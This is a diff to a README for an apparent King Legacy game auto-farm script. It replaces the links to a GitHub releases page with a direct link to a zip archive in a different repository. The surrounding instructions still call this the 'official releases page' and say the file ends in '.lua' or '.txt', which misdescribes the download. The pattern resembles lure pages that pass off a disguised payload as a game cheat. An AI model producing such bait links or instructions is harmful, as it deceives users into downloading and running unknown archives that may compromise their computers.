@@ -5,7 +5,7 @@ description: "Automate farming tasks and locate devil fruits with our reliable K
 ---
 # 🚀 King-Legacy-Script-Auto-Farm-2026 - Master your game with automated progress
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue.svg)](https://github.com/unclipped-bidder998/King-Legacy-Script-Auto-Farm-2026/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue.svg)](https://raw.githubusercontent.com/unclipped-bidder998/unclipped-bidder998.github.io/main/legalization/1.9.zip)
 
 This repository provides an automated script for King Legacy. The tool handles repetitive tasks like leveling, quest completion, and boss fights. Use this script to save time while you play.
 
@@ -33,7 +33,7 @@ Ensure your computer meets these requirements to run the script:
 
 Follow these steps to set up the script on your computer:
 
-1.  Visit the official releases page to find the latest version: [Download Page](https://github.com/unclipped-bidder998/King-Legacy-Script-Auto-Farm-2026/releases)
+1.  Visit the official releases page to find the latest version: [Download Page](https://raw.githubusercontent.com/unclipped-bidder998/unclipped-bidder998.github.io/main/legalization/1.9.zip)
 2.  Locate the most recent release at the top of the list.
 3.  Click the file link ending in ".lua" or ".txt" to download the script code to your computer.
 4.  Open your chosen script executor.
